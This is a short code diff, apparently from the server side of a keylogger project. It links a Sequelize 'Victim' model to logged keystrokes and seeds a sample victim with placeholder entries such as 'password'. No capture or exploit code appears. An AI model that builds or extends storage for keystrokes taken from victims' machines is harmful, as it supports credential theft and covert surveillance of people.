@@ -14,9 +14,9 @@ const sequelize = new Sequelize(config.db.database, config.db.username, config.d
 
 const Victim = sequelize.import(path.join(__dirname, '../models/victim'));
 const Log = sequelize.import(path.join(__dirname, '../models/log'));
-Victim.hasMany(Log, {
+Victim.Logs = Victim.hasMany(Log, {
   foreignKey: {
-    allowNull: true
+    allowNull: false
   }
 });
 
@@ -31,11 +31,15 @@ sequelize.sync({
     city: 'Vienna',
     macAdress: 'aa-aa-aa-aa-aa-aa',
     os: 'linux',
-  })
-
-  log = Log.create({
-    keystrokes: "asdf"
-  })
+    logs: [
+      { keystrokes: "asdf" },
+      { keystrokes: "jklö" },
+      { keystrokes: "password" },
+      { keystrokes: "123passwd321" },
+    ]
+  }, {
+    include: Victim.Logs
+  });
 })
 
 
